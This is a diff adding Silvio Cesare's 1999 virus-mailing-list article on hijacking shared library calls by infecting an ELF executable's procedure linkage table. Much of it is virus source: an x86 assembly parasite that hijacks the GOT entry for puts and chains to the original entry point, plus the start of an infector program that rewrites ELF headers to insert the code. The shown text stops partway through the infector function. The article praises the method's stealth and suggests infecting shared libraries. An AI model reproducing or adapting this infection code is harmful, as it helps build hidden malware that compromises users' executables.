@@ -1,0 +1,1458 @@
+SHARED LIBRARY CALL REDIRECTION USING ELF PLT INFECTION
+
+	- Silvio Cesare
+	- The Unix Virus Mailing List - http://virus.beergrave.net
+	- Novemeber 1999
+
+INTRODUCTION
+
+This article describes a method of shared library call redirection using ELF
+infection that redirects the Procedure Linkage Table (PLT) of an executeable.
+Thus, redirection is not resident outside of the infected executeable.  This
+has the advantage over the LD_PRELOAD redirection technique in that no
+environment variables are modified, thus remaining more hidden than previous
+techniques.  An implementation is provided for x86/Linux.
+
+THE PROCEDURE LINKAGE TABLE (PLT)
+
+From the ELF specifications... (not necessary to read but gives more detail
+than the followup text)
+
+"                       Procedure Linkage Table
+
+Much as the global offset table redirects position-independent address
+calculations to absolute locations, the procedure linkage table
+redirects position-independent function calls to absolute locations.
+The link editor cannot resolve execution transfers (such as function
+calls) from one executable or shared object to another. Consequently,
+the link editor arranges to have the program transfer control to
+entries in the procedure linkage table. On the SYSTEM V architecture,
+procedure linkage tables reside in shared text, but they use addresses
+in the private global offset table. The dynamic linker determines the
+destinations' absolute addresses and modifies the global offset
+table's memory image accordingly. The dynamic linker thus can redirect
+the entries without compromising the position-independence and
+sharability of the program's text. Executable files and shared object
+files have separate procedure linkage tables.
+
++ Figure 2-12: Absolute Procedure Linkage Table {*}
+
+  .PLT0:pushl   got_plus_4
+        jmp     *got_plus_8
+        nop; nop
+        nop; nop
+  .PLT1:jmp     *name1_in_GOT
+        pushl   $offset
+        jmp     .PLT0@PC
+  .PLT2:jmp     *name2_in_GOT
+        pushl   $offset
+        jmp     .PLT0@PC
+        ...
+
++ Figure 2-13: Position-Independent Procedure Linkage Table
+
+  .PLT0:pushl   4(%ebx)
+        jmp     *8(%ebx)
+        nop; nop
+        nop; nop
+  .PLT1:jmp     *name1@GOT(%ebx)
+        pushl   $offset
+        jmp     .PLT0@PC
+  .PLT2:jmp     *name2@GOT(%ebx)
+        pushl   $offset
+        jmp     .PLT0@PC
+        ...
+
+NOTE: As the figures show, the procedure linkage table instructions
+use different operand addressing modes for absolute code and for
+position-independent code. Nonetheless, their interfaces to the
+dynamic linker are the same.
+
+Following the steps below, the dynamic linker and the program
+``cooperate'' to resolve symbolic references through the procedure
+linkage table and the global offset table.
+
+1. When first creating the memory image of the program, the dynamic
+   linker sets the second and the third entries in the global offset
+   table to special values. Steps below explain more about these
+   values.
+2. If the procedure linkage table is position-independent, the address
+   of the global offset table must reside in %ebx. Each shared object
+   file in the process image has its own procedure linkage table, and
+   control transfers to a procedure linkage table entry only from
+   within the same object file. Consequently, the calling function is
+   responsible for setting the global offset table base register
+   before calling the procedure linkage table entry.
+3. For illustration, assume the program calls name1, which transfers
+   control to the label .PLT1.
+4. The first instruction jumps to the address in the global offset
+   table entry for name1. Initially, the global offset table holds the
+   address of the following pushl instruction, not the real address of
+   name1.
+5. Consequently, the program pushes a relocation offset (offset) on
+   the stack. The relocation offset is a 32-bit, non-negative byte
+   offset into the relocation table. The designated relocation entry
+   will have type R_386_JMP_SLOT, and its offset will specify the
+   global offset table entry used in the previous jmp instruction. The
+   relocation entry also contains a symbol table index, thus telling
+   the dynamic linker what symbol is being referenced, name1 in this
+   case.
+6. After pushing the relocation offset, the program then jumps to
+   .PLT0, the first entry in the procedure linkage table. The pushl
+   instruction places the value of the second global offset table
+   entry (got_plus_4 or 4(%ebx)) on the stack, thus giving the dynamic
+   linker one word of identifying information. The program then jumps
+   to the address in the third global offset table entry (got_plus_8
+   or 8(%ebx)), which transfers control to the dynamic linker.
+7. When the dynamic linker receives control, it unwinds the stack,
+   looks at the designated relocation entry, finds the symbol's value,
+   stores the ``real'' address for name1 in its global offset table
+   entry, and transfers control to the desired destination.
+8. Subsequent executions of the procedure linkage table entry will
+   transfer directly to name1, without calling the dynamic linker a
+   second time. That is, the jmp instruction at .PLT1 will transfer to
+   name1, instead of ``falling through'' to the pushl instruction.
+
+The LD_BIND_NOW environment variable can change dynamic linking
+behavior. If its value is non-null, the dynamic linker evaluates
+procedure linkage table entries before transferring control to the
+program. That is, the dynamic linker processes relocation entries of
+type R_386_JMP_SLOT during process initialization. Otherwise, the
+dynamic linker evaluates procedure linkage table entries lazily,
+delaying symbol resolution and relocation until the first execution of
+a table entry.
+
+NOTE: Lazy binding generally improves overall application performance,
+because unused symbols do not incur the dynamic linking overhead.
+Nevertheless, two situations make lazy binding undesirable for some
+applications. First, the initial reference to a shared object function
+takes longer than subsequent calls, because the dynamic linker
+intercepts the call to resolve the symbol. Some applications cannot
+tolerate this unpredictability. Second, if an error occurs and the
+dynamic linker cannot resolve the symbol, the dynamic linker will
+terminate the program. Under lazy binding, this might occur at
+arbitrary times. Once again, some applications cannot tolerate this
+unpredictability. By turning off lazy binding, the dynamic linker
+forces the failure to occur during process initialization, before the
+application receives control.
+"
+
+To explain in more detail...
+
+Shared library calls are treated special in executeable objects because they
+cannot be linked to the executeable at compile time.  This is due to the fact
+that shared libraries are not available to the executeable until runtime.
+The PLT was designed to handle such cases like these.  The PLT holds the code
+responsible for calling the dynamic linker to locate these desired routines.
+
+Instead of calling the real shared library routine in the executeable, the
+exucuteable calls an entry in the PLT.  It is then up to the PLT to resolve the
+symbol it represents and do the right thing.
+
+From the ELF specifications...
+
+" .PLT1:jmp     *name1_in_GOT
+        pushl   $offset
+        jmp     .PLT0@PC
+"
+
+This is the important info.   This is the routine called instead of the library
+call.  name1_in_GOT originally starts off pointing to the following pushl
+instruction.  The offset represents a relocation (see the ELF specifications)
+offset which has a reference to the symbol the library call represents.  This
+is used for the final jmp which jumps to the dynamic linker.  The dynamic
+linker then changes name1_in_GOT to point directly to the routine thus avoiding
+dynamic linking a second time.
+
+This summarizes the importance of the PLT in library lookups.  It can be noted
+that we can change name_in_GOT to point to our own code, thus replacing
+library calls.  If we save the state of the GOT before replacing, we can call
+the old library routine and thus redirect any library call.
+
+ELF INFECTION
+
+To inject a redirected library call into an executeable requires new code to
+be added to an executeable.  The actual procedure for ELF infection will not
+be described here as it has been covered very well in previous articles
+(http://www.big.net.au/~silvio - Unix Viruses/Unix ELF Parasites and Virus).
+
+PLT REDIRECTION
+
+The algorithm at the entry point code is as follows...
+
+	* mark the text segment writeable
+	* save the PLT(GOT) entry
+	* replace the PLT(GOT) entry with the address of the new lib call
+
+The algorithm in the new library call is as follows...
+
+	* do the payload of the new lib call
+	* restore the original PLT(GOT) entry
+	* call the lib call
+	* save the PLT(GOT) entry again (if its changed)
+	* replace the PLT(GOT) entry with the address of the new lib call
+
+GOT ADDRESS
+
+To extract the GOT address one must work backwords from the .rel.plt section
+as explained in the above information on the PLT.
+
+int do_dyn_symtab(
+	int fd,
+	Elf32_Shdr *shdr, Elf32_Shdr *shdrp,
+	const char *sh_function
+)
+{
+	Elf32_Shdr *strtabhdr = &shdr[shdrp->sh_link];
+	char *string;
+	Elf32_Sym *sym, *symp;
+	int i;
+
+	string = (char *)malloc(strtabhdr->sh_size);
+	if (string == NULL) {
+		perror("malloc");
+		exit(1);
+	}
+
+	if (lseek(
+		fd, strtabhdr->sh_offset, SEEK_SET) != strtabhdr->sh_offset
+	) {
+		perror("lseek");
+		exit(1);
+	}
+
+	if (read(fd, string, strtabhdr->sh_size) != strtabhdr->sh_size) {
+		perror("read");
+		exit(1);
+	}
+
+	sym = (Elf32_Sym *)malloc(shdrp->sh_size);
+	if (sym == NULL) {
+		perror("malloc");
+		exit(1);
+	}
+
+	if (lseek(fd, shdrp->sh_offset, SEEK_SET) != shdrp->sh_offset) {
+		perror("lseek");
+		exit(1);
+	}
+
+	if (read(fd, sym, shdrp->sh_size) != shdrp->sh_size) {
+		perror("read");
+		exit(1);
+	}
+
+	symp = sym;
+
+	for (i = 0; i < shdrp->sh_size; i += sizeof(Elf32_Sym)) {
+		if (!strcmp(&string[symp->st_name], sh_function)) {
+			free(string);
+			return symp - sym;
+		}
+
+		++symp;
+	}
+
+	free(string);
+	return -1;
+}
+
+int get_sym_number(
+	int fd, Elf32_Ehdr *ehdr, Elf32_Shdr *shdr, const char *sh_function
+)
+{
+	Elf32_Shdr *shdrp = shdr;
+	int i;
+
+	for (i = 0; i < ehdr->e_shnum; i++) {
+		if (shdrp->sh_type == SHT_DYNSYM) {
+			return do_dyn_symtab(fd, shdr, shdrp, sh_function);
+		}
+
+		++shdrp;
+	}
+}
+
+int do_rel(int fd, Elf32_Shdr *shdr, int sym)
+{
+	Elf32_Rel *rel, *relp;
+	int i;
+
+	rel = (Elf32_Rel *)malloc(shdr->sh_size);
+	if (rel == NULL) {
+		perror("malloc");
+		exit(1);
+	}
+
+	if (lseek(fd, shdr->sh_offset, SEEK_SET) != shdr->sh_offset) {
+		perror("lseek");
+		exit(1);
+	}
+
+	if (read(fd, rel, shdr->sh_size) != shdr->sh_size) {
+		perror("read");
+		exit(1);
+	}
+
+	relp = rel;
+
+	for (i = 0; i < shdr->sh_size; i += sizeof(Elf32_Rel)) {
+		if (ELF32_R_SYM(relp->r_info) == sym) {
+			return relp->r_offset;
+		}
+		++relp;
+	}
+
+	return -1;
+}
+
+int find_rel(
+	int fd,
+	const char *string,
+	Elf32_Ehdr *ehdr, Elf32_Shdr *shdr,
+	const char *sh_function
+)
+{
+	Elf32_Shdr *shdrp = shdr;
+	int sym;
+	int i;
+
+	sym = get_sym_number(fd, ehdr, shdr, sh_function);
+	if (sym < 0) {
+		return -1;
+	}
+
+	for (i = 0; i < ehdr->e_shnum; i++) {
+		if (!strcmp(&string[shdrp->sh_name], ".rel.plt")) {
+			return do_rel(fd, shdrp, sym);
+		}
+
+		++shdrp;
+	}
+
+	return -1;
+}
+
+PLT REDIRECTION
+
+To explain more how PLT redirection is done, the simplest method is to describe
+the sample code supplied; comments are marked with a hash sign (#).  This code
+is injected into an executeable and becomes the new entry point of the program.
+The library call that is redirected is printf, the new code prints a message
+before the printf supplied string.
+
+--
+# 
+# This routine is used for chaining a virus.  That is to keep the entry point
+# the same but append new code to the host.
+#
+
+void virchfunc(void)
+{
+__asm__("
+.globl virchstart
+	.type virchstart,@function
+virchstart:
+	call virchmain
+virchmain:
+	popl %esi				#
+	addl $(virchdata - virchmain),%esi	# movl $virdata,%esi
+
+	movl data_entry_point - virchdata(%esi),%edi
+						# movl data_entry_point,%edi
+	jmp *%edi
+
+.globl virchdata
+	.type virchdata,@function
+virchdata:
+
+.globl data_entry_point
+	.size data_entry_point,4
+	.type data_entry_point,@object
+data_entry_point:
+.long 0
+
+.globl virchend
+	.type virchend,@function
+virchend:
+");
+}
+
+#
+# This is the heart of the parasite
+#
+
+void virfunc(void)
+{
+__asm__("
+.globl L1
+	.type virstart,@function
+virstart:
+#
+# save the registers.  esi and edi arent used on startup so we can ignore them
+#
+	pushl %eax
+	pushl %ebx
+	pushl %ecx
+	pushl %edx
+
+#
+# dynamically determine the address of the virus data
+#
+	call virmain
+virmain:
+	popl %esi				#
+	addl $(virdata - virmain),%esi		# movl $virdata,%esi
+
+#
+# we save the address of the original PLT reference to be later used.  This
+# will be the address of the following instruction in the actual PLT
+#
+	movl plt_addr - virdata(%esi),%ebx	#
+	movl (%ebx),%ecx			#
+	movl %ecx,orig_plt_addr - virdata(%esi)	# movl plt_addr,orig_plt_addr
+
+#
+# we copy our new procedure to the GOT (from the PLT).
+#
+	movl %esi,%ebx				#
+	subl $(virdata - plt_puts),%ebx		#
+	movl plt_addr - virdata(%esi),%ecx	#
+	movl %ebx,(%ecx)			# movl $plt_puts,plt_addr
+
+#
+# This is part of the chaining routine.  we mark the entry point segment
+# writeable and copy back the original data
+#
+
+	movl $125,%eax
+	movl orig_entry_point - virdata(%esi),%ebx
+	movl %ebx,%edi				# for later
+	andl $~4095,%ebx
+	movl $8192,%ecx
+	movl $7,%edx
+	int $0x80
+
+	pushl %edi
+	leal store - virdata(%esi),%esi
+	movl $(virchend - virchstart),%ecx
+	rep
+	movsb
+	popl %edi
+
+#
+# restore the registers (remember esi and edi arent used)
+#
+	popl %edx
+	popl %ecx
+	popl %ebx
+	popl %eax
+
+#
+# jump back to the entry point
+#
+	jmp *%edi
+
+#
+# this routine is used by orig_plt_func to obtain the address of the virus
+# data.  so we can modify saved plt info.
+#
+.globl getvirdata
+	.type getvirdata,@function
+getvirdata:
+	pushl %ebp
+	movl %esp,%ebp
+
+	call getvirdatamain
+
+getvirdatamain:
+	popl %eax				#
+	addl $(virdata - getvirdatamain),%eax	# movl $virdata,%eax
+
+	movl %ebp,%esp
+	popl %ebp
+
+	ret
+
+.globl virdata
+	.type virdata,@function
+virdata:
+
+.globl orig_entry_point
+	.size orig_entry_point,4
+	.type orig_entry_point,@object
+orig_entry_point:
+.long 0
+
+.globl orig_plt_addr
+	.size orig_plt_addr,4
+	.type orig_plt_addr,@object
+orig_plt_addr:
+.long 0
+
+.globl plt_addr
+	.size plt_addr,4
+	.type plt_addr,@object
+plt_addr:
+.long 0
+
+.globl store
+	.type store,@object
+	.size store,virchend- virchstart
+store:
+	.zero virchend - virchstart
+
+.globl virend
+	.type virend,@function
+virend:
+");
+/*
+	we have a little wasted space here from cleaning up the stack frame
+	in the wrapper function.
+*/
+}
+
+#
+# position independant data
+#
+
+char *get_msg(void)
+{
+__asm__("
+	call msgmain
+msgmain:
+	popl %eax
+	addl $(msgdata - msgmain),%eax
+	jmp msgend
+msgdata:
+.ascii \"Hello \"
+msgend:
+");
+}
+
+int orig_plt_func(char *s)
+{
+	long *data = getvirdata();
+	int (*f)(char *);
+	int ret;
+
+#
+# we copy the original PLT(GOT) address back to the PLT(GOT) so we can call
+# the original function.  in this case 'puts' (or perhaps the dynamic linker)
+#
+	f = (void *)(*(long *)data[PLT_ADDR] = data[ORIG_PLT_ADDR]);
+#
+# call the original function
+#
+
+	ret = f(s);
+
+#
+# the PLT may have changed now, so we save it again. remember that if lazy
+# linking is used, the dynamic linker may change the PLT to point directly at
+# the shared lib call instead of calling the dynamic linker again
+#
+	data[ORIG_PLT_ADDR] = *(long *)data[PLT_ADDR];
+/*
+	the following line doesnt compile very nicely as it doesnt shortcut
+	the subtraction
+*/
+
+#
+# change the PLT back to call the new 'puts' call
+#
+	*(long *)data[PLT_ADDR] = (long)&((char *)data)[
+		(long)plt_puts - (long)virdata
+	];
+	return ret;
+}
+
+#
+# this is the new 'puts' function.  this can be anything, but remember, it
+# has to be position independant. which means if you cant use libc or absolute
+# information.
+#
+
+int plt_puts(char *s)
+{
+	_write(1, get_msg(), 6);
+	return orig_plt_func(s);
+}
+
+#
+# the end of the virus
+#
+
+void virendall(void)
+{
+}
+
+-- snip
+
+FUTURE DIRECTIONS
+
+It is possible to infect a shared library directly, and this is sometimes more
+desireable because the redirection stays resident for all executeables.  Also
+possible, is an even more stealth version of the PLT redirection described
+by modifying the process image directly thus the host executeable stays
+unmodified.  This however has the disadvantage that the redirection stays
+active only for the life of a single process, but if the system call execve
+is patched this can be restarted on each execution.
+
+CONCLUSION
+
+This article has described a method of redirecting shared library calls in
+an executeable by directly modifying the PLT of the executeable in question
+using ELF infection techniques.  It is more stealthy than previous techniques
+using LD_PRELOAD and has large possibilities.
+
+
+-- plt.c (MUST be compiled with -O2)
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <sys/stat.h>
+#include <sys/types.h>
+#include <sys/mman.h>
+#include <string.h>
+#include <fcntl.h>
+#include <unistd.h>
+#include <elf.h>
+#include <asm/unistd.h>
+
+#define ORIG_PLT_ADDR		1
+#define PLT_ADDR		2
+
+#define VIRUS_LENGTH	(virendall - virstart)
+#define CHAIN_LENGTH	(virchend - virchstart)
+#define PAGE_SIZE	4096
+#define PAGE_MASK	(PAGE_SIZE - 1)
+#define DEBUG_STRING	".data1"
+
+extern long orig_entry_point;
+extern long orig_plt_addr;
+extern long plt_addr;
+extern long data_entry_point;
+extern char *store;
+
+void virstart(void);
+void virend(void);
+void virchstart(void);
+void virchend(void);
+void virchdata(void);
+void virdata(void);
+long *getvirdata(void);
+int plt_puts(char *s);
+
+typedef struct {
+        Elf32_Ehdr      ehdr;
+        Elf32_Phdr*     phdr;
+        Elf32_Shdr*     shdr;
+	int		plen;
+        char**          section;
+	char*		string;
+        int             bss;
+} bin_t;
+
+#define __syscall3(type,name,type1,arg1,type2,arg2,type3,arg3) \
+type name(type1 arg1,type2 arg2,type3 arg3) \
+{ \
+long __res; \
+__asm__ volatile ("int $0x80" \
+        : "=a" (__res) \
+        : "0" (__NR##name),"b" ((long)(arg1)),"c" ((long)(arg2)), \
+                "d" ((long)(arg3))); \
+        return (type) __res; \
+}
+
+static inline __syscall3(int,_write,int,fd,const void *,buf,int,size);
+
+void virchfunc(void)
+{
+__asm__("
+.globl virchstart
+	.type virchstart,@function
+virchstart:
+	call virchmain
+virchmain:
+	popl %esi				#
+	addl $(virchdata - virchmain),%esi	# movl $virdata,%esi
+
+	movl data_entry_point - virchdata(%esi),%edi
+						# movl data_entry_point,%edi
+	jmp *%edi
+
+.globl virchdata
+	.type virchdata,@function
+virchdata:
+
+.globl data_entry_point
+	.size data_entry_point,4
+	.type data_entry_point,@object
+data_entry_point:
+.long 0
+
+.globl virchend
+	.type virchend,@function
+virchend:
+");
+}
+
+void virfunc(void)
+{
+__asm__("
+.globl L1
+	.type virstart,@function
+virstart:
+	pushl %eax
+	pushl %ebx
+	pushl %ecx
+	pushl %edx
+
+	call virmain
+virmain:
+	popl %esi				#
+	addl $(virdata - virmain),%esi		# movl $virdata,%esi
+
+	movl plt_addr - virdata(%esi),%ebx	#
+	movl (%ebx),%ecx			#
+	movl %ecx,orig_plt_addr - virdata(%esi)	# movl plt_addr,orig_plt_addr
+
+	movl %esi,%ebx				#
+	subl $(virdata - plt_puts),%ebx		#
+	movl plt_addr - virdata(%esi),%ecx	#
+	movl %ebx,(%ecx)			# movl $plt_puts,plt_addr
+
+	movl $125,%eax
+	movl orig_entry_point - virdata(%esi),%ebx
+	movl %ebx,%edi				# for later
+	andl $~4095,%ebx
+	movl $8192,%ecx
+	movl $7,%edx
+	int $0x80
+
+	pushl %edi
+	leal store - virdata(%esi),%esi
+	movl $(virchend - virchstart),%ecx
+	rep
+	movsb
+	popl %edi
+
+	popl %edx
+	popl %ecx
+	popl %ebx
+	popl %eax
+
+	jmp *%edi
+
+.globl getvirdata
+	.type getvirdata,@function
+getvirdata:
+	pushl %ebp
+	movl %esp,%ebp
+
+	call getvirdatamain
+
+getvirdatamain:
+	popl %eax				#
+	addl $(virdata - getvirdatamain),%eax	# movl $virdata,%eax
+
+	movl %ebp,%esp
+	popl %ebp
+
+	ret
+
+.globl virdata
+	.type virdata,@function
+virdata:
+
+.globl orig_entry_point
+	.size orig_entry_point,4
+	.type orig_entry_point,@object
+orig_entry_point:
+.long 0
+
+.globl orig_plt_addr
+	.size orig_plt_addr,4
+	.type orig_plt_addr,@object
+orig_plt_addr:
+.long 0
+
+.globl plt_addr
+	.size plt_addr,4
+	.type plt_addr,@object
+plt_addr:
+.long 0
+
+.globl store
+	.type store,@object
+	.size store,virchend- virchstart
+store:
+	.zero virchend - virchstart
+
+.globl virend
+	.type virend,@function
+virend:
+");
+/*
+	we have a little wasted space here from cleaning up the stack frame
+	in the wrapper function.
+*/
+}
+
+char *get_msg(void)
+{
+__asm__("
+	call msgmain
+msgmain:
+	popl %eax
+	addl $(msgdata - msgmain),%eax
+	jmp msgend
+msgdata:
+.ascii \"Hello \"
+msgend:
+");
+}
+
+int orig_plt_func(char *s)
+{
+	long *data = getvirdata();
+	int (*f)(char *);
+	int ret;
+
+	f = (void *)(*(long *)data[PLT_ADDR] = data[ORIG_PLT_ADDR]);
+	ret = f(s);
+	data[ORIG_PLT_ADDR] = *(long *)data[PLT_ADDR];
+/*
+	the following line doesnt compile very nicely as it doesnt shortcut
+	the subtraction
+*/
+	*(long *)data[PLT_ADDR] = (long)&((char *)data)[
+		(long)plt_puts - (long)virdata
+	];
+	return ret;
+}
+
+int plt_puts(char *s)
+{
+	_write(1, get_msg(), 6);
+	return orig_plt_func(s);
+}
+
+void virendall(void)
+{
+}
+
+char *get_virus(void)
+{
+	return (char *)virstart;
+}
+
+int init_virus(
+	int plt, int text_start, int data_start, int data_memsz, int entry,
+	bin_t *bin
+)
+{
+	int code_start = data_start + data_memsz;
+	int i;
+
+	if (mprotect(
+		(void *)((long)virstart & (~PAGE_MASK)),
+		PAGE_SIZE << 1,
+		PROT_READ | PROT_WRITE
+	) < 0) {
+		perror("mprotect");
+		exit(1);
+	}
+
+	if (mprotect(
+		(void *)((long)virchstart & (~PAGE_MASK)),
+		PAGE_SIZE << 1,
+		PROT_READ | PROT_WRITE
+	) < 0) {
+		perror("mprotect");
+		exit(1);
+	}
+
+	data_entry_point = code_start;
+	orig_entry_point = entry;
+	plt_addr = plt;
+
+	for (i = 0; i < bin->bss; i++) {
+		long vaddr = bin->shdr[i].sh_addr;
+
+		if (entry >= vaddr && entry < (vaddr + bin->shdr[i].sh_size)) {
+			char *p = &bin->section[i][entry - vaddr];
+
+			memcpy(&store, p, CHAIN_LENGTH);
+			memcpy(p, virchstart, CHAIN_LENGTH);
+			break;
+		}
+	}
+
+	return 0;
+}
+
+void do_elf_checks(Elf32_Ehdr *ehdr)
+{
+        if (strncmp(ehdr->e_ident, ELFMAG, SELFMAG)) {
+                fprintf(stderr, "File not ELF\n");
+                exit(1);
+        }
+
+        if (ehdr->e_type != ET_EXEC) {
+                fprintf(stderr, "ELF type not ET_EXEC or ET_DYN\n");
+                exit(1);
+        }
+
+        if (ehdr->e_machine != EM_386 && ehdr->e_machine != EM_486) {
+                fprintf(stderr, "ELF machine type not EM_386 or EM_486\n");
+                exit(1);
+        }
+
+        if (ehdr->e_version != EV_CURRENT) {
+                fprintf(stderr, "ELF version not current\n");
+                exit(1);
+        }
+}
+
+int do_dyn_symtab(
+	int fd,
+	Elf32_Shdr *shdr, Elf32_Shdr *shdrp,
+	const char *sh_function
+)
+{
+	Elf32_Shdr *strtabhdr = &shdr[shdrp->sh_link];
+	char *string;
+	Elf32_Sym *sym, *symp;
+	int i;
+
+	string = (char *)malloc(strtabhdr->sh_size);
+	if (string == NULL) {
+		perror("malloc");
+		exit(1);
+	}
+
+	if (lseek(
+		fd, strtabhdr->sh_offset, SEEK_SET) != strtabhdr->sh_offset
+	) {
+		perror("lseek");
+		exit(1);
+	}
+
+	if (read(fd, string, strtabhdr->sh_size) != strtabhdr->sh_size) {
+		perror("read");
+		exit(1);
+	}
+
+	sym = (Elf32_Sym *)malloc(shdrp->sh_size);
+	if (sym == NULL) {
+		perror("malloc");
+		exit(1);
+	}
+
+	if (lseek(fd, shdrp->sh_offset, SEEK_SET) != shdrp->sh_offset) {
+		perror("lseek");
+		exit(1);
+	}
+
+	if (read(fd, sym, shdrp->sh_size) != shdrp->sh_size) {
+		perror("read");
+		exit(1);
+	}
+
+	symp = sym;
+
+	for (i = 0; i < shdrp->sh_size; i += sizeof(Elf32_Sym)) {
+		if (!strcmp(&string[symp->st_name], sh_function)) {
+			free(string);
+			return symp - sym;
+		}
+
+		++symp;
+	}
+
+	free(string);
+	return -1;
+}
+
+int get_sym_number(
+	int fd, Elf32_Ehdr *ehdr, Elf32_Shdr *shdr, const char *sh_function
+)
+{
+	Elf32_Shdr *shdrp = shdr;
+	int i;
+
+	for (i = 0; i < ehdr->e_shnum; i++) {
+		if (shdrp->sh_type == SHT_DYNSYM) {
+			return do_dyn_symtab(fd, shdr, shdrp, sh_function);
+		}
+
+		++shdrp;
+	}
+}
+
+int do_rel(int fd, Elf32_Shdr *shdr, int sym)
+{
+	Elf32_Rel *rel, *relp;
+	int i;
+
+	rel = (Elf32_Rel *)malloc(shdr->sh_size);
+	if (rel == NULL) {
+		perror("malloc");
+		exit(1);
+	}
+
+	if (lseek(fd, shdr->sh_offset, SEEK_SET) != shdr->sh_offset) {
+		perror("lseek");
+		exit(1);
+	}
+
+	if (read(fd, rel, shdr->sh_size) != shdr->sh_size) {
+		perror("read");
+		exit(1);
+	}
+
+	relp = rel;
+
+	for (i = 0; i < shdr->sh_size; i += sizeof(Elf32_Rel)) {
+		if (ELF32_R_SYM(relp->r_info) == sym) {
+			return relp->r_offset;
+		}
+		++relp;
+	}
+
+	return -1;
+}
+
+int find_rel(
+	int fd,
+	const char *string,
+	Elf32_Ehdr *ehdr, Elf32_Shdr *shdr,
+	const char *sh_function
+)
+{
+	Elf32_Shdr *shdrp = shdr;
+	int sym;
+	int i;
+
+	sym = get_sym_number(fd, ehdr, shdr, sh_function);
+	if (sym < 0) {
+		return -1;
+	}
+
+	for (i = 0; i < ehdr->e_shnum; i++) {
+		if (!strcmp(&string[shdrp->sh_name], ".rel.plt")) {
+			return do_rel(fd, shdrp, sym);
+		}
+
+		++shdrp;
+	}
+
+	return -1;
+}
+
+void load_section(char **section, int fd, Elf32_Shdr *shdr)
+{
+        if (lseek(fd, shdr->sh_offset, SEEK_SET) < 0) {
+                perror("lseek");
+                exit(1);
+        }
+
+        *section = (char *)malloc(shdr->sh_size);
+        if (*section == NULL) {
+                perror("malloc");
+                exit(1);
+        }
+
+        if (read(fd, *section, shdr->sh_size) != shdr->sh_size) {
+                perror("read");
+                exit(1);
+        }
+}
+
+int load_bin(int fd, bin_t *bin)
+{
+        char **sectionp;
+        Elf32_Ehdr *ehdr;
+        Elf32_Shdr *shdr;
+        int slen;
+	Elf32_Shdr *strtabhdr;
+        int i;
+
+        ehdr = &bin->ehdr;
+
+        if (read(fd, ehdr, sizeof(Elf32_Ehdr)) != sizeof(Elf32_Ehdr)) {
+                perror("read");
+                exit(1);
+        }
+
+        do_elf_checks(ehdr);
+
+        bin->phdr = (Elf32_Phdr *)malloc(
+		bin->plen = sizeof(Elf32_Phdr)*ehdr->e_phnum
+	);
+        if (bin->phdr == NULL) {
+                perror("malloc");
+                exit(1);
+        }
+
+/* read the phdr's */
+
+        if (lseek(fd, ehdr->e_phoff, SEEK_SET) < 0) {
+                perror("lseek");
+                exit(1);
+        }
+
+        if (read(fd, bin->phdr, bin->plen) != bin->plen) {
+                perror("read");
+                exit(1);
+        }
+
+        slen = sizeof(Elf32_Shdr)*ehdr->e_shnum;
+
+        bin->shdr = (Elf32_Shdr *)malloc(slen);
+        if (bin->shdr == NULL) {
+                perror("malloc");
+                exit(1);
+        }
+
+        bin->section = (char **)malloc(sizeof(char **)*ehdr->e_shnum);
+        if (bin->section == NULL) {
+                perror("malloc");
+                exit(1);
+        }
+
+        if (lseek(fd, ehdr->e_shoff, SEEK_SET) < 0) {
+                perror("lseek");
+                exit(1);
+        }
+
+        if (read(fd, bin->shdr, slen) != slen) {
+                perror("read");
+                exit(1);
+        }
+
+	strtabhdr = &bin->shdr[ehdr->e_shstrndx];
+
+	bin->string = (char *)malloc(strtabhdr->sh_size);
+	if (bin->string == NULL) {
+		perror("malloc");
+		exit(1);
+	}
+
+	if (lseek(
+		fd, strtabhdr->sh_offset, SEEK_SET
+	) != strtabhdr->sh_offset) {
+		perror("lseek");
+		exit(1);
+	}
+
+	if (read(fd, bin->string, strtabhdr->sh_size) != strtabhdr->sh_size) {
+		perror("read");
+		exit(1);
+	}
+
+	bin->bss = -1;
+
+        for (
+                i = 0, sectionp = bin->section, shdr = bin->shdr;
+                i < ehdr->e_shnum;
+                i++, sectionp++
+        ) {
+                if (shdr[i].sh_type == SHT_NOBITS) {
+                        bin->bss = i;
+		} else {
+                        load_section(sectionp, fd, &shdr[i]);
+                }
+        }
+
+	if (bin->bss < 0) {
+		printf("No bss section\n");
+		exit(1);
+	}
+
+        return 0;
+}
+
+void infect_elf(
+        char *host,
+        char *(*get_virus)(void),
+        int (*init_virus)(int, int, int, int, int, bin_t *),
+        int len,
+	const char *sh_function
+)
+
+{
+	Elf32_Phdr *phdr;
+	Elf32_Shdr *shdr;
+	int move = 0;
+	int out, fd;
+	int evaddr, text_start = -1, plt;
+	int bss_len, addlen, addlen2, addlen3;
+	int offset, pos, oshoff;
+	int i;
+	char null = 0;
+	struct stat st_buf;
+        char tempname[8] = "vXXXXXX";
+	bin_t bin;
+	Elf32_Shdr newshdr;
+	char *zero;
+
+	fd = open(host, O_RDONLY);
+	if (fd < 0) {
+		perror("open");
+		exit(1);
+	}
+
+/* read the ehdr */
+
+	load_bin(fd, &bin);
+
+	plt = find_rel(
+		fd,
+		bin.string,
+		&bin.ehdr, bin.shdr,
+		sh_function
+	);
+	if (plt < 0) {
+		printf("No dynamic function: %s\n", sh_function);
+		exit(1);
+	}
+
+	phdr = bin.phdr;
+
+	for (i = 0; i < bin.ehdr.e_phnum; i++) {
+		if (phdr->p_type == PT_LOAD) {
+			if (phdr->p_offset == 0) {
+				text_start = phdr->p_vaddr;
+			} else {
+				if (text_start < 0) {
+					fprintf(stderr, "No text segment??\n");
+					exit(1);
+				}
+
+/* is this the data segment ? */
+				offset = phdr->p_offset + phdr->p_filesz;
+				bss_len = phdr->p_memsz - phdr->p_filesz;
+
+				if (init_virus != NULL)
+					init_virus(
+						plt,
+						text_start, phdr->p_vaddr,
+						phdr->p_memsz,
+						bin.ehdr.e_entry,
+						&bin
+					);
+
+				break;
+			}
+		}
+
+		++phdr;
+	}
+
+	addlen = len + bss_len;
+
+
+/*
+	update the phdr's to reflect the extention of the data segment (to
+	allow virus insertion)
+*/
+
+	phdr = bin.phdr;
+
+	for (i = 0; i < bin.ehdr.e_phnum; i++) {
+		if (phdr->p_type != PT_DYNAMIC) {
+			if (move) {
+				phdr->p_offset += addlen;
+			} else if (phdr->p_type == PT_LOAD && phdr->p_offset) {
+/* is this the data segment ? */
+
+				phdr->p_filesz += addlen;
+				phdr->p_memsz += addlen;
+
+ 				move = 1;
+			}
+		}
+
+		++phdr;
+	}
+
+/* update ehdr to reflect new offsets */
+
+        if (fstat(fd, &st_buf) < 0) {
+                perror("fstat");
+                exit(1);
+        }
+
+/* write the new virus */
+
